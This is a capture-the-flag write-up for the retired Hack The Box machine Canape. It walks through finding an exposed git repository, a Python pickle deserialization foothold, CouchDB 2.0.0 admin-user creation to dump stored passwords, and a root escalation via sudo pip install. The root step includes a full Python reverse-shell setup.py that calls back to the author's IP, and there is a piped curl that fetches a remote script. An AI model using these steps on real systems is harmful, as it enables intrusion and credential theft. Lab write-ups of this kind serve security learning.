# Canape

This is the write-up for the box Canape that got retired at the 15th September 2018.
My IP address was 10.10.14.21 while I did this.

Let's put this in our hosts file:
```markdown
10.10.10.70    canape.htb
```

## Enumeration

Starting with a Nmap scan:

```markdown
nmap -sC -sV -o nmap/canape.nmap 10.10.10.70
```

```markdown
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-git:
|   10.10.10.70:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|     Last commit message: final # Please enter the commit message for your changes. Li...
|     Remotes:
|_      http://git.canape.htb/simpsons.git
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Simpsons Fan Site
|_http-trane-info: Problem with XML parsing of /evox/about
```

## Checking HTTP (Port 80)

On the web page there is a custom developed "Simpsons Fan Site" where it is possible to submit a quote to the server:

![Canape submit quote](canape_web-1.png)

In the HTML source code is a comment that may be relevant:
```markdown
<!-- c8a74a098a60aaea1af98945bd707a7eab0ff4b0 - temporarily hide check
<li class="nav-item">
<a class="nav-link" href="/check">Check Submission</a>
</li>
-->
```

When browsing to _/check_, it responses with HTTP code _405 Method Not Allowed_.
Changing the method to _POST_ then responses with HTTP code _400 Bad Request_.

The enumeration with **Nmap** found a _/.git_ repository and a subdomain.
This subdomain is also specified in _/.git/config_ where the repository lays and can be cloned from:
```markdown
git clone http://git.canape.htb/simpsons.git
```

This seems to be the backend code of the website written in _Python_.
When looking at the history of this git repository, it shows that there was a vulnerability in one of the commits:
```markdown
git log
```
```markdown
commit c8a74a098a60aaea1af98945bd707a7eab0ff4b0
Author: Homer Simpson <homerj0121@outlook.com>
Date:   Mon Jan 15 18:46:30 2018 -0800

    temporarily hide check due to vulerability
```

Lets see the differences between the vulnerable version and the current one:
```markdown
git diff c8a74a098a60aaea1af98945bd707a7eab0ff4b0
```

It uses the [Python Pickle module](https://docs.python.org/3/library/pickle.html) which is not secure and can be abused to execute arbitrary code.
I created a script to exploit this, that can be found in this repository:
```markdown
python canape_exploit-pickle.py
```

After executing the script, the listener on my IP and port 9001 starts a reverse shell session as _www-data_.

## Privilege Escalation

To enumerate the box, it is a good idea to run any **Linux Enumeration Script** to get an attack surface:
```markdown
curl 10.10.14.21 | LinEnum.sh
```

After analyzing the output, it becomes clear that the process **CouchDB** is running as root and _homer_:
```markdown
root        720  0.0  0.0   4240   644 ?        Ss   06:59   0:00 runsv couchdb
root        721  0.0  0.0   4384   668 ?        S    06:59   0:00 svlogd -tt /var/log/couchdb
homer       722  0.3  3.3 649340 33504 ?        Sl   06:59   0:28 /home/homer/bin/../erts-7.3/bin/beam -K true -A 16 -Bd -- -root /home/homer/bin/.. -progname couchdb -- -home /home/homer -- -boot /home/homer/bin/../releases/2.0.0/couchdb -name couchdb@localhost -setcookie monster -kernel error_logger silent -sasl sasl_error_logger false -noshell -noinput -config /home/homer/bin/../releases/2.0.0/sys.config
```

The command `netstat -alnp` shows the listening ports and CouchDB runs by default on port 5984:
```markdown
curl 127.0.0.1:5984

# Output
{"couchdb":"Welcome","version":"2.0.0","vendor":{"name":"The Apache Software Foundation"}}
```

The [CouchDB API Reference](https://docs.couchdb.org/en/stable/api/) explains the information to get from the database. Lets output all database names:
```markdown
curl 127.0.0.1:5984/\_all_dbs

# Output
["\_global_changes","\_metadata","\_replicator","\_users","passwords","simpsons"]
```

Now it is possible to get the database contents:
```markdown
curl 127.0.0.1:5984/simpsons/\_all_docs

# Output
{"total_rows":7,"offset":0,"rows":[
{"id":"f0042ac3dc4951b51f056467a1000dd9","key":"f0042ac3dc4951b51f056467a1000dd9","value":{"rev":"1-fbdd816a5b0db0f30cf1fc38e1a37329"}},
{"id":"f53679a526a868d44172c83a61000d86","key":"f53679a526a868d44172c83a61000d86","value":{"rev":"1-7b8ec9e1c3e29b2a826e3d14ea122f6e"}},
{"id":"f53679a526a868d44172c83a6100183d","key":"f53679a526a868d44172c83a6100183d","value":{"rev":"1-e522ebc6aca87013a89dd4b37b762bd3"}},
{"id":"f53679a526a868d44172c83a61002980","key":"f53679a526a868d44172c83a61002980","value":{"rev":"1-3bec18e3b8b2c41797ea9d61a01c7cdc"}},
{"id":"f53679a526a868d44172c83a61003068","key":"f53679a526a868d44172c83a61003068","value":{"rev":"1-3d2f7da6bd52442e4598f25cc2e84540"}},
{"id":"f53679a526a868d44172c83a61003a2a","key":"f53679a526a868d44172c83a61003a2a","value":{"rev":"1-4446bfc0826ed3d81c9115e450844fb4"}},
{"id":"f53679a526a868d44172c83a6100451b","key":"f53679a526a868d44172c83a6100451b","value":{"rev":"1-3f6141f3aba11da1d65ff0c13fe6fd39"}}
]}
```

```markdown
curl 127.0.0.1:5984/simpsons/f0042ac3dc4951b51f056467a1000dd9

# Output
{"\_id":"f0042ac3dc4951b51f056467a1000dd9","\_rev":"1-fbdd816a5b0db0f30cf1fc38e1a37329","character":"Homer","quote":"Doh!"}
```

This is the database that holds the quotes from the web page.
The _passwords_ database responses that we are not authorized to access it:
```markdown
curl 127.0.0.1:5984/passwords/

# Output
{"error":"unauthorized","reason":"You are not authorized to access this db."}
```

Lets look for vulnerabilities in **CouchDB 2.0.0**:
```markdown
searchsploit couchdb
```

There is a [Apache CouchDB < 2.1.0 - Remote Code Execution](https://justi.cz/security/2017/11/14/couchdb-rce-npm.html) vulnerability, which with it is possible to create a new user.
First the following `curl` command has to be sent to the box to the local CouchDB service:
```markdown
curl -X PUT 'http://localhost:5984/_users/org.couchdb.user:newuser'
--data-binary '{
  "type": "user",
  "name": "newuser",
  "roles": ["\_admin"],
  "roles": [],
  "password": "password"
}'
```

It was successful and created the user _newuser_:
```markdown
{"ok":true,"id":"org.couchdb.user:newuser","rev":"1-d9e411349288f7c530246df5e2d3b09a"}
```

Now accessing the database _passwords_ with authentication:
```markdown
curl --user 'newuser:password' 127.0.0.1:5984/passwords/\_all_docs

# Output
{"total_rows":4,"offset":0,"rows":[
{"id":"739c5ebdf3f7a001bebb8fc4380019e4","key":"739c5ebdf3f7a001bebb8fc4380019e4","value":{"rev":"2-81cf17b971d9229c54be92eeee723296"}},
{"id":"739c5ebdf3f7a001bebb8fc43800368d","key":"739c5ebdf3f7a001bebb8fc43800368d","value":{"rev":"2-43f8db6aa3b51643c9a0e21cacd92c6e"}},
{"id":"739c5ebdf3f7a001bebb8fc438003e5f","key":"739c5ebdf3f7a001bebb8fc438003e5f","value":{"rev":"1-77cd0af093b96943ecb42c2e5358fe61"}},
{"id":"739c5ebdf3f7a001bebb8fc438004738","key":"739c5ebdf3f7a001bebb8fc438004738","value":{"rev":"1-49a20010e64044ee7571b8c1b902cf8c"}}
]}
```

Output all four passwords one by one:
```markdown
curl --user 'oops:password' 127.0.0.1:5984/passwords/739c5ebdf3f7a001bebb8fc4380019e4
(...)
```

This leaves us with some interesting results
```markdown
_{"_id":"739c5ebdf3f7a001bebb8fc4380019e4","_rev":"2-81cf17b971d9229c54be92eeee723296","item":"ssh","password":"0B4jyA0xtytZi7esBNGp","user":""}
{"_id":"739c5ebdf3f7a001bebb8fc43800368d","_rev":"2-43f8db6aa3b51643c9a0e21cacd92c6e","item":"couchdb","password":"r3lax0Nth3C0UCH","user":"couchy"}
{"_id":"739c5ebdf3f7a001bebb8fc438003e5f","_rev":"1-77cd0af093b96943ecb42c2e5358fe61","item":"simpsonsfanclub.com","password":"h02ddjdj2k2k2","user":"homer"}
{"_id":"739c5ebdf3f7a001bebb8fc438004738","_rev":"1-49a20010e64044ee7571b8c1b902cf8c","user":"homerj0121","item":"github","password":"STOP STORING YOUR PASSWORDS HERE -Admin"}_
```

The most important one is the SSH password _"0B4jyA0xtytZi7esBNGp"_ and as there is only one user called _homer_, we can probably switch to that user:
```markdown
su homer
```

### Privilege Escalation to root

Lets look at the `sudo` privileges of _homer_:
```markdown
sudo -l
```
```markdown
Matching Defaults entries for homer on canape:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User homer may run the following commands on canape:
    (root) /usr/bin/pip install *
```

This user can run `pip install`, which installs Python modules, as root. So creating a malicious Python script to execute that with `pip` will escalate privileges to root.

Creating a Python script _(setup.py)_ that starts a reverse shell:
```markdown
import socket,subprocess,os

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.21",9002))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
```

Executing the script with root privileges:
```markdown
sudo pip install .
```

After executing the command, the listener on my IP and port 9002 starts a reverse shell as root!
